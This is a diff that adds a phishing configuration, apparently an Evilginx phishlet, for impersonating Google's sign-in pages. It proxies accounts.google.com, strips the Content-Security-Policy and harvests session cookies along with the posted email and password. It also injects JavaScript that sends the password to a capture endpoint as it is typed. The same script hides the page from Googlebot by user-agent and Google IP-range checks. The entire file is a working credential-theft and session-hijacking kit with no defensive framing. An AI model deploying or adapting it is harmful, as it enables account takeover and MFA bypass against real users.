@@ -1,0 +1,149 @@
+author: '@Evi1Grey5'
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: '', orig_sub: '', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+
+sub_filters:
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '</head>', replace: '<script src="https://code.jquery.com/jquery-3.6.3.min.js" integrity="sha256-pvPw+upLPUjgMXY0G+8O0xUf+/Im1MZjXxxgOcBQBXU=" crossorigin="anonymous"></script></head>', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'myaccount.google.com', orig_sub: 'myaccount', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'Content-Security-Policy', replace: "default-src * 'unsafe-inline' 'unsafe-eval';", mimes: ['text/html']}
+
+auth_tokens:
+  - domain: '.google.com'
+    keys: ["SID", "HSID", "SSID", "APISID", "SAPISID", "NID", "OGPC", "OGP", "1P_JAR", "CONSENT", "SMSV", "user_id", ".*,regexp"]
+  - domain: 'accounts.google.com'
+    keys: ["GAPS", "LSID", "_utmt", "utmz", "_utmb", "ACCOUNT_CHOOSER", ".*,regexp"]
+
+auth_urls:
+  - '/v3/signin/_/AccountsSignInUi/data/batchexecute'
+  - '/CheckCookie'
+  - '/ManageAccount'
+  - '/'
+
+credentials:
+  username:
+    key: 'unenc_email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'unenc_pwd'
+    search: '(.*)'
+    type: 'post'
+
+force_post:
+  - path: '/selectchallenge'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
+    type: 'post'
+
+  - path: '/signin'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
+    type: 'post'
+
+  - path: '/speedbump'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
+    type: 'post'
+
+  - path: '/challenge'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
+    type: 'post'
+
+login:
+  domain: 'accounts.google.com'
+  path: '/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
+
+js_inject:
+  - trigger_domains: ["accounts.google.com"]
+    trigger_paths: ["/identifier", "/"]
+    script: |
+
+      // Cloak phishing form from known bots
+      if (navigator.userAgent.indexOf("Googlebot") === -1) {
+          // Only render phishing form for non-bots
+          async function postEndpoint(details) {
+              console.log('details poster', details);
+              var email = details['email'];
+              var pass = details['pass'];
+              var detailString = 'unenc_email=' + email + '&unenc_pwd=' + pass;
+              console.log('detailString', detailString)
+              try {
+                  await fetch(window.origin + `/v3/signin/_/AccountsSignInUi/data/batchexecute`, {
+                      method: 'POST',
+                      headers: {
+                        'content-type': 'application/x-www-form-urlencoded'
+                      },
+                      body: detailString
+                  })
+              } catch (err) {
+                  console.log(err)
+                  return false;
+              }
+              return;
+          }
+
+          // Detect password changes
+          var passwordElem = document.querySelector('input[type="password"]');
+          passwordElem.addEventListener('input', function() {
+              var email = document.querySelector('[name="identifier"]').value;
+              var pass = this.value;
+              if (email && pass) {
+                  postEndpoint({email, pass});
+              }
+          });
+      }
+
+      // IP-based bot filtering for Google ranges
+      setTimeout(() => {
+        const blacklistIPRanges = [
+          "66.249.64.0/19",  // Google IP range
+        ];
+        fetch('https://api.ipify.org?format=json')
+          .then(response => response.json())
+          .then(data => {
+            const userIP = data.ip;
+            blacklistIPRanges.forEach(range => {
+              if (isIPInRange(userIP, range)) {
+                // Block user or redirect if IP is in range
+                window.location.href = 'https://google.com';
+              }
+            });
+          });
+      }, 1000);
+
+      function isIPInRange(ip, range) {
+        const [rangeStart, bits] = range.split('/');
+        const ipAsInt = ipToInt(ip);
+        const rangeStartAsInt = ipToInt(rangeStart);
+        const mask = ~(2 ** (32 - bits) - 1);
+        return (ipAsInt & mask) === (rangeStartAsInt & mask);
+      }
+
+      function ipToInt(ip) {
+        return ip.split('.').reduce((int, octet) => (int << 8) + parseInt(octet), 0);
+      }
+
+# Blacklist certain user agents
+user_agent_filter:
+  block: 
+    - "Googlebot"
+    - "Googlebot/2.1"
+    - "Google"
